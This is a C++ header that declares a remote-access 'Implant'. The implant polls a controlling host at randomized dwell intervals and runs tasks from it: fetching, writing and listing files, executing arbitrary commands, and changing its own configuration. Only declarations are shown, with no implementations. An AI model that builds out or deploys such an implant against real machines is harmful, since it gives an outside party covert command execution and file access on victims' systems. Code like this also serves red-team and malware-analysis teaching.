/*
 * This file is subject to the terms and conditions defined in
 * file 'LICENSE', which is part of this source code package.
 */
#pragma once

#include <boost/asio.hpp>
#include <string>
#include <iostream>
#include <istream>
#include <ostream>
#include <string_view>
#include <cstdint>
#include <variant>
#include <random>
#include <boost/property_tree/ptree.hpp>
#include <boost/uuid/uuid.hpp>

struct Implant {
  Implant(std::string host, std::string service, boost::asio::io_context& io_context);
  void serve();
private:
  const std::string host;
  const std::string service;
  boost::asio::io_context& io_context;
  bool is_running;
  std::exponential_distribution<double> dwell_distribution_seconds;
  std::random_device device;
};

struct GetTask{
  constexpr static std::string_view key{ "get" };
  GetTask(const boost::uuids::uuid &id, std::string path);
  [[nodiscard]] std::string run() const;
  const boost::uuids::uuid id;
private:
  const std::string path;
};

struct PutTask{
  constexpr static std::string_view key{ "put" };
  PutTask(const boost::uuids::uuid &id, std::string path,
          std::string contents);
  [[nodiscard]] std::string run() const;
  const boost::uuids::uuid id;
private:
  const std::string path;
  const std::string contents;
};

struct ListTask{
  constexpr static std::string_view key{ "list" };
  ListTask(const boost::uuids::uuid &id, std::string path,
           uint8_t depth);
  [[nodiscard]] std::string run() const;
  const boost::uuids::uuid id;
private:
  const std::string path;
  const uint8_t depth;
};

struct ExecuteTask {
  constexpr static std::string_view key{ "execute" };
  ExecuteTask(const boost::uuids::uuid &id, std::string command);
  [[nodiscard]] std::string run() const;
  const boost::uuids::uuid id;
private:
  const std::string command;
};

struct ConfigureTask {
  constexpr static std::string_view key{ "configure" };
  ConfigureTask(const boost::uuids::uuid &id, double mean_dwell, bool is_running, Implant& implant);
  [[nodiscard]] std::string run() const;
  const boost::uuids::uuid id;
private:
  Implant& implant;
  const double mean_dwell;
  const bool is_running;
};

using Task = std::variant<GetTask, PutTask, ListTask, ExecuteTask, ConfigureTask>;

[[nodiscard]] std::string make_request(std::string_view host, std::string_view port, std::string_view payload, boost::asio::io_context& io_context);
[[nodiscard]] Task parse_task_from(const boost::property_tree::ptree& task_tree, Implant& implant);
